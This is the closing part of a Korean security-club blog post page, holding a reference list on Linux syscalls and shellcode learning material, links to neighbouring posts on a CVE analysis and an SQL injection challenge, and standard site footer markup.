+<h1 id="참고문헌"><a href="#참고문헌" class="headerlink" title="참고문헌"></a>참고문헌</h1><p>Chromium OS Docs. (n.d.). Linux System Call Table . <span class="exturl" data-url="aHR0cHM6Ly9jaHJvbWl1bS5nb29nbGVzb3VyY2UuY29tL2Nocm9taXVtb3MvZG9jcy8rL21hc3Rlci9jb25zdGFudHMvc3lzY2FsbHMubWQ=">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</span>.</p>
+<p>Dreamhack. (n.d.). Exploit Tech: Shellcode. <span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5kcmVhbWhhY2suaW8vNTA=">https://learn.dreamhack.io/50</span></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/System-Hacking/" rel="tag"># System Hacking</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/04/03/3101_250402/" rel="prev" title="지원서 뜯어보기 [상] CVE-2024-27956 분석">
+                  <i class="fa fa-angle-left"></i> 지원서 뜯어보기 [상] CVE-2024-27956 분석
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/05/20/3103_250520/" rel="next" title="지원서 뜯어보기 [하] dreamhack simple_sqli_chatgpt">
+                  지원서 뜯어보기 [하] dreamhack simple_sqli_chatgpt <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy;
+    
+      2024 – <span itemprop="copyrightYear">2026</span>
+    
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">SWING</span>
+  </div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
